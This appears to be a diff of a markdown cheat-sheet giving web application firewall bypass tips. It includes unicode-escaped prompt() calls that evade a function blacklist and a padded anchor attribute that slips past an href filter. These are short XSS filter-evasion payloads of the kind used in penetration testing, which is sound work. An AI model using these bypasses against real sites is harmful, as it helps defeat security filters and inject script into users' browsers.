@@ -4,20 +4,20 @@
 
 1. If you can get the IP it will totally bypass the WAF!
 
-print, confirm, alert are blacklisted. A workaround can be using unicode. 
+2. print, confirm, alert are blacklisted. A workaround can be using unicode. 
 
-prompt
-```js
-\u0070rompt(1)
-eval(\u0070rompt(1))
-```
+  prompt
+  ```js
+  \u0070rompt(1)
+  eval(\u0070rompt(1))
+  ```
 
-href
-```
-# Blocked
-<a href="hello">
+  href
+  ```
+  # Blocked
+  <a href="hello">
 
-# Bypass 
+  # Bypass 
 
-<a fooooooooooooooooooooooo href="hello">
-```
+  <a fooooooooooooooooooooooo href="hello">
+  ```
